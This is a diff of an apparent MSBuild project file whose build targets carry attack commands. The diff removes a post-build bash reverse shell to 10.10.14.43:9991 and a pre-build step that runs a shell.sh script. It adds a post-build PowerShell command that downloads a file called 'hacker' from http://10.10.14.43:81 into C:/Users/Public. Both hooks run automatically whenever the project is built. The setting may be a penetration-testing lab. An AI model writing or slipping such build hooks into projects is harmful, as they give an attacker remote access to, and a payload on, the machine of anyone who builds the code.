@@ -9,11 +9,7 @@
   </PropertyGroup>
 
   <Target Name="PostBuild" AfterTargets="PostBuildEvent">
-    <Exec Command="%25windir%25\sysnative\bash.exe -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.43/9991 0&gt;&amp;1&quot;" />
-  </Target>
-
-  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-    <Exec Command="%25windir%25\sysnative\bash.exe -c &quot;`echo '$(ProjectDir)shell.sh' | sed -re 's/\\\\/\//g; s/([A-Z]):/\/mnt\/\L\1\E/i;'`&quot;" />
+    <Exec Command="powershell.exe -command iwr -Uri http://10.10.14.43:81/hacker -OutFile C:/Users/Public/hacker" />
   </Target>
 
 </Project>
